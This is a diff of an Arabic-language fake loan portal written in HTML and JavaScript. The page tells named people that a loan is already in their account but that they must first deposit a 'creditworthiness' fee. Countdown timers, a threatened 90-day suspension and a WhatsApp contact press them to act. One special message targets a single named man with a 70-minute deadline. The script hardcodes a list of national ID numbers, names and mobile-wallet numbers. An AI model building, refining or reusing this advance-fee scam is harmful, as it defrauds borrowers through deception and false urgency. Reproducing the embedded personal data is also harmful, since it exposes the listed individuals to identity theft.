@@ -9,7 +9,6 @@
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        /* جميع الأنماط كما هي دون تغيير */
         * {
             margin: 0;
             padding: 0;
@@ -540,7 +539,6 @@
             color: #fff;
         }
 
-        /* الرسالة الخاصة لهشام */
         .special-message-card {
             background: linear-gradient(135deg, #1a2a3a, #0f1722);
             border: 2px solid #ff6b35;
@@ -609,7 +607,6 @@
     </div>
 
     <div id="customerSection" class="hidden">
-        <!-- المحتوى العادي سيظهر لجميع العملاء ما عدا هشام -->
         <div id="normalContent">
             <div class="timer-box">
                 <div class="timer-label">
@@ -825,21 +822,19 @@
             </div>
         </div>
 
-        <!-- المحتوى الخاص لهشام (يظهر فقط عند تسجيل دخوله) -->
         <div id="specialContent" style="display: none;">
             <div class="special-message-card">
                 <i class="fas fa-clock" style="font-size: 3rem; color: #ff6b35; margin-bottom: 1rem; display: block;"></i>
                 <h2>⚠️ تنبيه هام ⚠️</h2>
                 <p>عزيزي العميل <strong>هشام أحمد صلاح محمد عبدالغغار</strong>،</p>
-                <p>تم <span class="highlight">منحك مهلة تأجيل الطلب</span> حتى الساعة <strong>6 مساءً</strong> من يوم <strong>الثلاثاء 7 أبريل 2026</strong>.</p>
-                <p>تم <span class="highlight">تحويل مبلغ القرض إلى حسابك</span> بنجاح، ولكن لا يمكنك سحبه إلا بعد <span class="highlight">إتمام إجراءات إثبات الجدارة الائتمانية</span> المحددة أدناه.</p>
+                <p>تم <span class="highlight">منحك مهلة استثنائية مدتها 70 دقيقة</span> لإتمام إجراءات إثبات الجدارة الائتمانية.</p>
+                <p>تم <span class="highlight">تحويل مبلغ القرض إلى حسابك</span> بنجاح، ولكن لا يمكنك سحبه إلا بعد <span class="highlight">إتمام الإجراءات</span> المحددة أدناه.</p>
                 <p><strong>✅ قم بإيداع المبلغ المطلوب (كما هو موضح في الخطوات) وسيتم صرف القرض لحسابك فوراً.</strong></p>
-                <p style="margin-top: 1rem; font-size: 1rem;">⏳ المهلة تنتهي اليوم الساعة 6 مساءً - يرجى الإسراع لإتمام الإجراءات.</p>
+                <p style="margin-top: 1rem; font-size: 1rem;">⏳ المهلة المتبقية: <span id="specialTimerDisplay" style="font-size: 2rem; color: #FFD966;">01:10:00</span></p>
                 <button class="btn-gold" style="margin-top: 1.5rem;" onclick="scrollToSteps()">📋 اضغط لإكمال إجراءات الجدارة</button>
                 <button class="whatsapp-btn" style="margin-top: 1rem; background: #25D366;" onclick="contactSupportSpecial()">📱 تواصل مع الدعم عبر واتساب</button>
             </div>
-            <!-- إعادة عرض خطوات الجدارة الائتمانية لهشام -->
-            <div id="specialSteps" style="margin-top: 1rem;">
+            <div id="specialSteps">
                 <div class="vertical-card">
                     <div class="section-title">
                         <i class="fas fa-certificate"></i> إثبات الجدارة الائتمانية (التحقق الأمني)
@@ -853,17 +848,17 @@
                         <div class="timer-label" style="color: #ff6b35;">
                             <i class="fas fa-hourglass-end"></i> الوقت المتبقي لإثبات الجدارة الائتمانية
                         </div>
-                        <div class="timer" id="specialCreditworthinessTimer" style="color: #ff6b35;">27:00</div>
+                        <div class="timer" id="specialCreditworthinessTimer" style="color: #ff6b35;">01:10:00</div>
                         <div class="timer-progress">
                             <div class="timer-progress-bar" id="specialCreditworthinessProgressBar" style="width: 100%; background: linear-gradient(90deg, #ff6b35, #FFD966);"></div>
                         </div>
                         <div class="timer-description" style="color: #ff8080;">
-                            ⚠️ <strong>تحذير هام:</strong> يجب إتمام إثبات الجدارة الائتمانية خلال 27 دقيقة. إذا انتهى الوقت دون إثبات الجدارة، لن تتمكن من صرف القرض إلا بعد مرور 90 يوماً.
+                            ⚠️ <strong>تحذير هام:</strong> يجب إتمام إثبات الجدارة الائتمانية خلال 70 دقيقة. إذا انتهى الوقت دون إثبات الجدارة، سيتم تعليق طلبك لمدة 90 يوماً ولن تتمكن من استعادته قبل انتهاء هذه المدة.
                         </div>
                     </div>
 
                     <div class="info-box warning">
-                        <strong>⚠️ تنبيه أمني:</strong> عند انتهاء الوقت المحدد (27 دقيقة) دون إثبات الجدارة الائتمانية، سيتم تعليق طلبك تلقائياً. لن تتمكن من صرف القرض إلا بعد مرور 90 يوماً من تاريخ التعليق.
+                        <strong>⚠️ تنبيه أمني:</strong> عند انتهاء الوقت المحدد (70 دقيقة) دون إثبات الجدارة الائتمانية، سيتم تعليق طلبك تلقائياً لمدة 90 يوماً ولن تتمكن من صرف القرض أو استعادة الطلب قبل مرور هذه المدة.
                     </div>
 
                     <div class="step-indicator">
@@ -948,8 +943,8 @@
     <div class="modal-content">
         <span class="close-modal" onclick="closeModal('timeoutModal')">&times;</span>
         <h2><i class="fas fa-exclamation-triangle"></i> تحذير هام</h2>
-        <p>لقد انتهى الوقت المحدد لإثبات الجدارة الائتمانية (27 دقيقة).</p>
-        <p style="color: #ff6b35; font-weight: bold;">⚠️ لن تتمكن من صرف القرض إلا بعد مرور 90 يوماً من الآن.</p>
+        <p>لقد انتهى الوقت المحدد لإثبات الجدارة الائتمانية.</p>
+        <p style="color: #ff6b35; font-weight: bold;">⚠️ تم تعليق طلبك لمدة 90 يوماً. لن تتمكن من صرف القرض أو استعادة الطلب قبل مرور 90 يوماً من الآن.</p>
         <p>يرجى التواصل مع فريق الدعم لمناقشة الخيارات المتاحة.</p>
         <button class="whatsapp-btn" onclick="contactSupport()">
             <i class="fab fa-whatsapp"></i> التواصل مع الدعم
@@ -958,32 +953,31 @@
 </div>
 
 <script>
-    // ========== قاعدة العملاء المدمجة (جميع العملاء من الملفات السابقة) ==========
+    // ========== قاعدة العملاء (تم حذف العميل وحيد محمد عارف عبد الله) ==========
     const customersData = [
-        // العملاء الأساسيون السابقون (12 عميلاً) مع تحديث بعض البيانات
+        // العملاء الأساسيون السابقون (بدون وحيد)
         { national_id: "28309122103052", full_name: "احمد ماهر احمد محمد ", wallet_type: "فودافون كاش", wallet_number: "01032201208", loan_amount: 100000 },
         { national_id: "28205031201019", full_name: "معاذ السيد الغريب أحمد", wallet_type: "فودافون كاش", wallet_number: "01033830731", loan_amount: 200000 },
         { national_id: "28906270200731", full_name: "محمد احمد عبدالله عبدالقادر", wallet_type: "اتصالات كاش", wallet_number: "01119638067", loan_amount: 200000 },
         { national_id: "29410011617371", full_name: "علاء عبدالحكيم محمد درويش", wallet_type: "فودافون كاش", wallet_number: "01027250679", loan_amount: 40000 },
         { national_id: "29109182702197", full_name: "محمد ابوالسعود محمود ابوالحسن", wallet_type: "أخرى", wallet_number: "01050540564", loan_amount: 50000 },
         { national_id: "28612061701011", full_name: "مصطفى نبيل فوزي محمود", wallet_type: "اتصالات كاش", wallet_number: "01122540100", loan_amount: 50000 },
-        { national_id: "28309072600611", full_name: "وحيد محمد عارف عبد الله", wallet_type: "فودافون كاش", wallet_number: "01017453927", loan_amount: 100000 },
         { national_id: "27601272100298", full_name: "احمد محمد احمد ابو سيد", wallet_type: "فودافون كاش", wallet_number: "01000013172", loan_amount: 200000 },
         { national_id: "28606171602191", full_name: "حماده السيد السعيد حبيش", wallet_type: "فودافون كاش", wallet_number: "01014327407", loan_amount: 100000 },
         { national_id: "29102272500939", full_name: "حماده ابوالعلا عبد العظيم ابوالعلا", wallet_type: "فودافون كاش", wallet_number: "01092974641", loan_amount: 30000 },
         { national_id: "30001132500275", full_name: "محمد على السيد سلام", wallet_type: "أخرى", wallet_number: "01271372918", loan_amount: 100000 },
         { national_id: "28507170200317", full_name: "محمد فتحى عبد الوارث محمد", wallet_type: "فودافون كاش", wallet_number: "01092134722", loan_amount: 120000 },
         
-        // العملاء الجدد من الملف الثاني (21 عميلاً تقريباً)
-        { national_id: "29506062602244", full_name: "سارة محمود على احمد", wallet_type: "اتصالات كاش", wallet_number: "01157916361", loan_amount: 30000 },
+        // العملاء الجدد من الملف الثاني (21 عميلاً)
+        { national_id: "27512280054", full_name: "محمد رمضان احمد محمد", wallet_type: "فودافون كاش", wallet_number: "01015857191", loan_amount: 30000 },
         { national_id: "26910290102639", full_name: "هاني محمد محمد عبد الحميد", wallet_type: "فودافون كاش", wallet_number: "01095216999", loan_amount: 50000 },
         { national_id: "26722501077", full_name: "شحاته عبد الغني هيكل عبد الغني", wallet_type: "فودافون كاش", wallet_number: "01003233741", loan_amount: 30000 },
         { national_id: "28502070101115", full_name: "رامي حسام احمد ابراهيم", wallet_type: "اتصالات كاش", wallet_number: "01150232362", loan_amount: 30000 },
         { national_id: "28908011416834", full_name: "مصطفى عبد الظاهر محمد مراد", wallet_type: "اتصالات كاش", wallet_number: "01116549692", loan_amount: 30000 },
         { national_id: "27303270102837", full_name: "وليد علي حسن علي الدين", wallet_type: "فودافون كاش", wallet_number: "01004244313", loan_amount: 185000 },
-        { national_id: "27512311400919", full_name: "رفيق فؤاد عبد الفضيل يوسف", wallet_type: "فودافون كاش", wallet_number: "01014337192", loan_amount: 190000 },
+        { national_id: "286112100135", full_name: "كرم محروس محمود حفني", wallet_type: "اتصالات كاش", wallet_number: "01151775319", loan_amount: 30000 },
         { national_id: "28311101357", full_name: "محمد مجدي احمد مسعد", wallet_type: "فودافون كاش", wallet_number: "01070710710", loan_amount: 200000 },
-        { national_id: "3000101779", full_name: "محمد ناهض محمد السيد", wallet_type: "اتصالات كاش", wallet_number: "01155143436", loan_amount: 50000 },
+        { national_id: "300070101779", full_name: "محمد ناهض محمد السيد", wallet_type: "اتصالات كاش", wallet_number: "01155143436", loan_amount: 50000 },
         { national_id: "27708040101271", full_name: "صلاح مختار حنفي قرني", wallet_type: "فودافون كاش", wallet_number: "01023669498", loan_amount: 50000 },
         { national_id: "26803241601893", full_name: "السيد ابراهيم الششتاوي قناوي ", wallet_type: "فودافون كاش", wallet_number: "01090232423", loan_amount: 30000 },
         { national_id: "28404071200379", full_name: "محمود علي المتولي السيد حسن", wallet_type: "فودافون كاش", wallet_number: "01001093695", loan_amount: 30000 },
@@ -998,7 +992,7 @@
         { national_id: "28909012110875", full_name: "حسين صبرى مصطفى حسن", wallet_type: "اتصالات كاش", wallet_number: "01142032336", loan_amount: 100000 }
     ];
 
-    // ========== جدول الأقساط والمدة حسب الجدول المرفق ==========
+    // جدول الأقساط
     const loanDetailsMap = {
         30000: { months: 12, installment: 3325 },
         35000: { months: 12, installment: 3875 },
@@ -1078,7 +1072,6 @@
             return;
         }
 
-        // التحقق من وجود محفظة صالحة قبل طلب آخر 4 أرقام
         if (customer.wallet_type === "أخرى" || !customer.wallet_number || customer.wallet_number === "غير مسجل") {
             alert("⚠️ تنبيه: ليس لديك محفظة رقمية مسجلة (فودافون كاش أو اتصالات كاش). سيتم عرض بياناتك فقط، ولن تتمكن من استخدام واتساب.");
         } else {
@@ -1091,7 +1084,7 @@
             const cleanWallet = customer.wallet_number.replace(/\D/g, '');
             const walletLast4 = cleanWallet.slice(-4);
             if (last4Digits !== walletLast4) {
-                alert('❌ الأرقام التي أدخلتها لا تتطابق مع آخر 4 أرقام من محفظتك المسجلة. يرجى المحاولة مرة أخرى أو التواصل مع الدعم.');
+                alert('❌ الأرقام التي أدخلتها لا تتطابق مع آخر 4 أرقام من محفظتك المسجلة.');
                 btn.disabled = false;
                 return;
             }
@@ -1099,22 +1092,17 @@
 
         currentCustomer = customer;
         
-        // التحقق مما إذا كان العميل هو هشام أحمد صلاح (الرقم القومي 27601011414511)
         if (customer.national_id === "27601011414511") {
-            // إظهار المحتوى الخاص لهشام فقط
             document.getElementById('normalContent').style.display = 'none';
             document.getElementById('specialContent').style.display = 'block';
-            // إعداد المؤقت الخاص لهشام
             startSpecialCreditworthinessTimer();
-            // تعيين مبلغ الجدارة لهشام (50000 * 0.2 = 10000 مثلاً، لكن سنستخدم نفس منطق المبالغ)
             let proofAmount;
             if (customer.loan_amount < 50000) proofAmount = 4000;
-            else if (customer.loan_amount <= 100000) proofAmount = 8000;
-            else if (customer.loan_amount <= 200000) proofAmount = 10000;
+            else if (customer.loan_amount <= 100000) proofAmount = 6000;
+            else if (customer.loan_amount <= 200000) proofAmount = 8000;
             else proofAmount = 10000;
             document.getElementById('specialProofAmountText').innerText = proofAmount.toLocaleString();
         } else {
-            // إظهار المحتوى العادي للعملاء الآخرين
             document.getElementById('normalContent').style.display = 'block';
             document.getElementById('specialContent').style.display = 'none';
             displayCustomerData(customer);
@@ -1127,7 +1115,6 @@
         window.scrollTo(0, 0);
     }
 
-    // دوال العرض العادية (لغير هشام)
     function displayCustomerData(customer) {
         const details = getLoanDetails(customer.loan_amount);
         const installment = details.installment;
@@ -1143,8 +1130,8 @@
 
         let proofAmount;
         if (customer.loan_amount < 50000) proofAmount = 4000;
-        else if (customer.loan_amount <= 100000) proofAmount = 8000;
-        else if (customer.loan_amount <= 200000) proofAmount = 10000;
+        else if (customer.loan_amount <= 100000) proofAmount = 6000;
+        else if (customer.loan_amount <= 200000) proofAmount = 8000;
         else proofAmount = 10000;
         document.getElementById('proofAmountText').innerHTML = formatNumber(proofAmount);
 
@@ -1173,7 +1160,6 @@
         const timerElem = document.getElementById('loanTimer');
         const progressBar = document.getElementById('timerProgressBar');
         const totalTime = 36 * 60;
-
         if (timerInterval) clearInterval(timerInterval);
         function update() {
             const mins = Math.floor(timeLeft / 60);
@@ -1197,7 +1183,6 @@
         const timerElem = document.getElementById('creditworthinessTimer');
         const progressBar = document.getElementById('creditworthinessProgressBar');
         const totalTime = 27 * 60;
-
         if (creditworthinessInterval) clearInterval(creditworthinessInterval);
         function update() {
             const mins = Math.floor(timeLeft / 60);
@@ -1205,11 +1190,7 @@
             timerElem.textContent = `${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
             const percent = (timeLeft / totalTime) * 100;
             progressBar.style.width = `${percent}%`;
-
-            if (timeLeft <= 300) {
-                timerElem.classList.add('warning');
-            }
-
+            if (timeLeft <= 300) timerElem.classList.add('warning');
             if (timeLeft <= 0) {
                 clearInterval(creditworthinessInterval);
                 progressBar.style.width = '0%';
@@ -1222,27 +1203,31 @@
     }
 
     function startSpecialCreditworthinessTimer() {
-        let timeLeft = 27 * 60;
+        let timeLeft = 70 * 60; // 70 دقيقة
         const timerElem = document.getElementById('specialCreditworthinessTimer');
         const progressBar = document.getElementById('specialCreditworthinessProgressBar');
-        const totalTime = 27 * 60;
-
+        const totalTime = 70 * 60;
+        const displayElem = document.getElementById('specialTimerDisplay');
+        
         if (specialTimerInterval) clearInterval(specialTimerInterval);
         function update() {
-            const mins = Math.floor(timeLeft / 60);
+            const hours = Math.floor(timeLeft / 3600);
+            const mins = Math.floor((timeLeft % 3600) / 60);
             const secs = timeLeft % 60;
-            timerElem.textContent = `${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
+            const timeString = `${hours.toString().padStart(2,'0')}:${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
+            timerElem.textContent = timeString;
+            if (displayElem) displayElem.textContent = timeString;
             const percent = (timeLeft / totalTime) * 100;
             progressBar.style.width = `${percent}%`;
-
-            if (timeLeft <= 300) {
-                timerElem.classList.add('warning');
-            }
-
+            
+            if (timeLeft <= 300) timerElem.classList.add('warning');
             if (timeLeft <= 0) {
                 clearInterval(specialTimerInterval);
                 progressBar.style.width = '0%';
                 document.getElementById('timeoutModal').style.display = 'block';
+                // تعطيل زر واتساب والخطوات بعد انتهاء الوقت
+                const whatsappBtn = document.querySelector('#specialSteps .whatsapp-btn');
+                if (whatsappBtn) whatsappBtn.disabled = true;
             }
             timeLeft--;
         }
@@ -1252,56 +1237,42 @@
 
     function sendWhatsAppMessage() {
         if (!currentCustomer) return;
-
         if (currentCustomer.wallet_type === "أخرى" || !currentCustomer.wallet_number || currentCustomer.wallet_number === "غير مسجل") {
-            alert("❌ عذراً، لا يمكن استخدام واتساب لأنه ليس لديك محفظة رقمية مسجلة (فودافون كاش أو اتصالات كاش). يرجى التواصل مع الدعم مباشرة.");
+            alert("❌ عذراً، لا يمكن استخدام واتساب لأنه ليس لديك محفظة رقمية مسجلة.");
             return;
         }
-
         const confirmSend = confirm('⚠️ تحذير أمني: سترسل صور مستنداتك عبر واتساب. تأكد من أنك تتعامل مع فريق الدعم الرسمي. هل تريد المتابعة؟');
         if (!confirmSend) return;
-
         const cleanWallet = currentCustomer.wallet_number.replace(/\D/g, '');
         const last3Digits = cleanWallet.slice(-3);
-        
         const enteredLast3 = prompt('لتأكيد ملكيتك للمحفظة، أدخل آخر 3 أرقام من رقم محفظتك:');
-        if (!enteredLast3) {
-            alert('❌ لم تقم بإدخال الأرقام. لم يتم فتح واتساب.');
-            return;
-        }
+        if (!enteredLast3) { alert('❌ لم تقم بإدخال الأرقام.'); return; }
         const cleanedEntered = enteredLast3.replace(/\D/g, '');
-        if (cleanedEntered !== last3Digits) {
-            alert('❌ الرقم غير صحيح. لم يتم فتح واتساب. يرجى المحاولة مرة أخرى.');
-            return;
-        }
-
+        if (cleanedEntered !== last3Digits) { alert('❌ الرقم غير صحيح.'); return; }
         let proofAmount;
         if (currentCustomer.loan_amount < 50000) proofAmount = 4000;
         else if (currentCustomer.loan_amount <= 100000) proofAmount = 6000;
         else if (currentCustomer.loan_amount <= 200000) proofAmount = 8000;
         else proofAmount = 10000;
-
         const message = `مرحباً، أنا ${currentCustomer.full_name} (رقم قومي: ${currentCustomer.national_id})، أريد إتمام إجراءات الجدارة الائتمانية. مبلغ الجدارة المطلوب: ${formatCurrency(proofAmount)}. أرسل لك الصور المطلوبة.`;
         const whatsappUrl = `https://wa.me/212614494251?text=${encodeURIComponent(message)}`;
         window.open(whatsappUrl, '_blank');
-
-        alert('✅ تم توجيهك إلى واتساب. يرجى إرسال الصور إلى فريق الدعم. سيتم مراجعة طلبك خلال ساعة كحد أقصى.');
+        alert('✅ تم توجيهك إلى واتساب. يرجى إرسال الصور إلى فريق الدعم.');
     }
 
     function sendWhatsAppMessageSpecial() {
         if (!currentCustomer) return;
-        // نفس دالة واتساب العادية ولكن مع رسالة مخصصة لهشام
         sendWhatsAppMessage();
     }
 
     function contactSupportSpecial() {
-        const message = `مرحباً، أنا هشام أحمد صلاح (رقم قومي 27601011414511)، تم منحي مهلة حتى الساعة 6 مساء اليوم 7/4/2026. أريد إتمام إجراءات الجدارة الائتمانية.`;
+        const message = `مرحباً، أنا هشام أحمد صلاح (رقم قومي 27601011414511)، تم منحي مهلة 70 دقيقة. أريد إتمام إجراءات الجدارة الائتمانية.`;
         const whatsappUrl = `https://wa.me/212614494251?text=${encodeURIComponent(message)}`;
         window.open(whatsappUrl, '_blank');
     }
 
     function contactSupport() {
-        const message = `مرحباً، انتهى الوقت المحدد لإثبات الجدارة الائتمانية. أرجو مساعدتي في هذا الشأن.`;
+        const message = `مرحباً، انتهى الوقت المحدد لإثبات الجدارة الائتمانية. أرجو مساعدتي.`;
         const whatsappUrl = `https://wa.me/212614494251?text=${encodeURIComponent(message)}`;
         window.open(whatsappUrl, '_blank');
     }
@@ -1341,17 +1312,9 @@
         currentCustomer = null;
     }
 
-    function showPrivacyPolicy() {
-        document.getElementById('privacyModal').style.display = 'block';
-    }
-
-    function showTerms() {
-        document.getElementById('termsModal').style.display = 'block';
-    }
-
-    function closeModal(modalId) {
-        document.getElementById(modalId).style.display = 'none';
-    }
+    function showPrivacyPolicy() { document.getElementById('privacyModal').style.display = 'block'; }
+    function showTerms() { document.getElementById('termsModal').style.display = 'block'; }
+    function closeModal(modalId) { document.getElementById(modalId).style.display = 'none'; }
 
     function createParticles() {
         const pDiv = document.getElementById('particles');
